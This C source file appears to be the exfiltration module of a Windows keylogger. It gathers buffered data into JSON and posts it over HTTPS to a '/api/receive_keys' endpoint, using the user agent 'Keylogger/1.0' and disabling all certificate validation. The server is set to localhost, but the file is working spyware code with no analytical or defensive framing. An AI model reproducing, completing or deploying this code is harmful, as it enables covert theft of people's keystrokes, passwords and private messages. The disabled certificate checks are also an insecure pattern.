#include "sender.h"
#include <winhttp.h>
#include <stdio.h>
#include <windows.h>
#include "buffer.h"
#include "utils.h"

#pragma comment(lib, "winhttp.lib")

static const wchar_t* SERVER = L"localhost";
static const wchar_t* ENDPOINT = L"/api/receive_keys";
static const INTERNET_PORT SERVER_PORT = 7089;

bool send_data_https(const wchar_t* server, const wchar_t* endpoint, const char* json_data) {
    bool result = false;
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    hSession = WinHttpOpen(L"Keylogger/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession) {
        log_error("WinHttpOpen failed");
        goto cleanup;
    }

    hConnect = WinHttpConnect(hSession, server, SERVER_PORT, 0);
    if (!hConnect) {
        log_error("WinHttpConnect failed");
        goto cleanup;
    }

    hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        endpoint,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    if (!hRequest) {
        log_error("WinHttpOpenRequest failed");
        goto cleanup;
    }

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))) {
        log_error("WinHttpSetOption failed, error code: %lu", GetLastError());
    }

    LPCWSTR headers = L"Content-Type: application/json";
    DWORD headers_len = (DWORD)wcslen(headers);

    if (!WinHttpSendRequest(hRequest,
        headers,
        headers_len,
        (LPVOID)json_data,
        (DWORD)strlen(json_data),
        (DWORD)strlen(json_data),
        0)) {
        log_error("WinHttpSendRequest failed, error code: %lu", GetLastError());
        goto cleanup;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        log_error("WinHttpReceiveResponse failed, error code: %lu", GetLastError());
        goto cleanup;
    }

    result = true;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return result;
}

bool send_buffer_to_server(void) {
    char* json = buffer_get_json_and_clear();

    if (!json) {
        log_error("Buffer is empty, nothing to send");
        return false;
    }

    log_info("Sending JSON data: %s", json);

    bool success = send_data_https(SERVER, ENDPOINT, json);

    free(json);
    return success;
}